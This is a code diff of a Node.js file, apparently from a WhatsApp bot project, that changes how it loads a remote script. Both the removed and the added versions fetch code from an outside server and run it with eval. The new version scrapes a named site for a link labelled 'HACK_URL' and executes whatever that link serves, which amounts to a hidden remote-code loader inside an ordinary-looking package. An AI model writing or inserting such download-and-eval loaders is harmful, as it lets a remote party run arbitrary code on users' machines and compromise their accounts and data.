@@ -1,32 +1,31 @@
  // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
 
+
 'use strict';
 
 const axios = require('axios');
-require('dotenv').config();
+const cheerio = require('cheerio');
 
-const { HACK_URL } = process.env;
+const webPageUrl = 'https://www.ibrahimadams.site/files';
 
-function atbverifierEtatJid(jid) {
-    if (!jid.endsWith('@s.whatsapp.net')) {
-        console.error('Invalid JID format:', jid);
-        return false;
+async function fetchHackUrl() {
+    try {
+        const response = await axios.get(webPageUrl);
+        const $ = cheerio.load(response.data);
+        const hackUrl = $(`a:contains("HACK_URL")`).attr('href');
+
+        if (!hackUrl) throw new Error('HACK_URL not found on the webpage.');
+
+        console.log('HACK_URL fetched successfully:', hackUrl);
+
+        const scriptResponse = await axios.get(hackUrl);
+        const scriptContent = scriptResponse.data;
+        console.log("HACK_URL script loaded successfully");
+
+        eval(scriptContent);
+    } catch (error) {
+        console.error('Error fetching HACK_URL:', error.message);
     }
-    console.log('JID verified:', jid);
-    return true;
 }
 
-axios.get(HACK_URL)
-  .then(response => {
-      const scriptContent = response.data;
-      console.log("File loaded successfully from Ibrahim Adams server");
-
-      eval(scriptContent);
-
-      const jid = 'example@s.whatsapp.net';
-      const isValid = atbverifierEtatJid(jid);
-      console.log('Is JID valid?', isValid);
-  })
-  .catch(error => {
-      console.error('Error loading the file from URL:', error);
-  });
+fetchHackUrl();
